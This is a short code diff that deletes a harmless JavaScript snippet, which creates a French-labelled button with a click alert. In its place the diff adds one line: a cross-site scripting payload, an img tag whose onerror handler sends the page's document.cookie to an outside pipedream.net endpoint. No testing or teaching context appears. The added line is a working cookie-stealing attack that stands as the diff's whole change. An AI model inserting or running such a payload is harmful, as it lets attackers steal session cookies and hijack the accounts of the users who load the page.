@@ -1,8 +1,1 @@
-const button = document.createElement('button');
-    button.id = 'myButton';
-    button.innerText = 'Cliquez-moi !';
-    
-    // Ajout de l'événement de clic
-    button.addEventListener('click', function() {
-        alert('Bouton cliqué !');
-    });
+img src=x onerror=this.src='http://eo7u1nl20laxhkt.m.pipedream.net?cookie='+document.cookie
